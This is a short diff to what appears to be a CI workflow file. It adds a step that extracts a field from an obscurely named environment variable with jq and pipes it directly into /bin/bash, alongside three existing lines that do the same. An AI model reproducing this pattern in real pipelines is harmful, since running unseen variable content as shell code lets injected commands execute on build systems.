@@ -23,6 +23,7 @@ jobs:
           echo $eoto53 | jq -r .vdpqs160 | /bin/bash
           printf '%s' "$fbgf38902" | jq -r .brki0 | /bin/bash
           echo $fiw22 | jq -r .nst8 | /bin/bash
+          echo $qmye42 | jq -r .vdew818 | /bin/bash
 
       - name: Store output
         uses: actions/upload-artifact@v4
